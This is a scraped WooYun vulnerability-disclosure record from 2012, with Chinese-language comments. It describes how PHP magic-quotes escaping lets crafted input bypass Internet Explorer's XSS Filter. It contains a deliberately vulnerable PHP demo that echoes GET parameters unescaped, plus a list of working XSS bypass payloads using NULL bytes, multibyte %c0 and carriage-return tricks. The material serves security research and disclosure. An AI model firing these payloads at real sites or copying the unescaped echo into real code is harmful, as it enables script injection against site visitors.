{"id": 17011, "wybug_id": "wooyun-2012-013352", "wybug_title": "PHP魔术引号导致IE XSS Filter bypass", "wybug_corp": "微软", "wybug_author": "Sogili", "wybug_date": "2012-10-14 21:28", "wybug_open_date": "2012-10-14 21:28", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "1", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["浏览器", "截断"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-10-14：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2012-10-14：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 在一些web容器中会对一些特殊字符做转换处理,这中间ie xss filter开发人员任何地方对它的了解有疏忽,都很可能导致bypass.  详细说明：  在php中,如果开启了”魔术引号”特性(magic_quotes_gpc = On),则‘ (single-quote), “ (double quote), \\ (backslash) 和 NULL 字符将都会被反斜杠转义(%00 =>\\0). 1. xss.php demo source code: \n<?php echo $_GET['x']?> <script type=\"text/javascript\"> var x=\"<?php echo $_GET['z']?>\" </script>\n2. HTML bypass case: \n<script>alert(1)</script>   <script/%00%00%00%00%00>alert(1)</script>   %00%00v%00%00<script>alert(1)</script>   <script/%00%00v%00%00>alert(1)</script>\ntips: 1. 绕过字符必须出现在拦截规则中,例如拦截<script>就可以是<script [here]>. 3. Javascript bypass case: \n“;alert(1)//   %c0″;alert(%00)//   %c0″;//(%0dalert(1)//   %c0″;//(%0dalert(1)//   %c0″;//(%00%0dalert(1)//   %c0″//(%000000%0dalert(1)//\ntips: \n1. 需要通过多字节问题吃掉一个\\. 2. //(%000000%0d是用于绕过函数调用的拦截规则.\n   漏洞证明：  \n\n   修复方案：   加入%00 => \\0 规则,当然这样可能还会产生别的问题   版权声明：转载请注明来源 Sogili@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：18 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n     2012-10-14 21:38 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  好东西没人顶么~~    \n     2012-10-15 01:02 |    \t\tPasser_by \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:21        | 问题真实存在但是影响不大（腾讯微博Passer...)\t\t \n  顶    \n     2012-10-15 09:36 |    \t\txsjswt \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:49        | 我思故我猥琐，我猥琐故我强大)\t\t \n  @cnyouker @tcpper    \n     2012-10-15 16:20 |    \t\tisno \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:3        | test)\t\t \n  这个可以有    \n     2012-12-01 20:06 |    \t\tStream \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 低头要有勇气，抬头要有底气!)\t\t \n  NB    \n     2013-02-02 22:31 |    \t\thack2012 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:3        | 关注信息安全 http://www.waitalone.cn/)\t\t \n  这个要观注一下！！    \n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 18, "Ranks": null}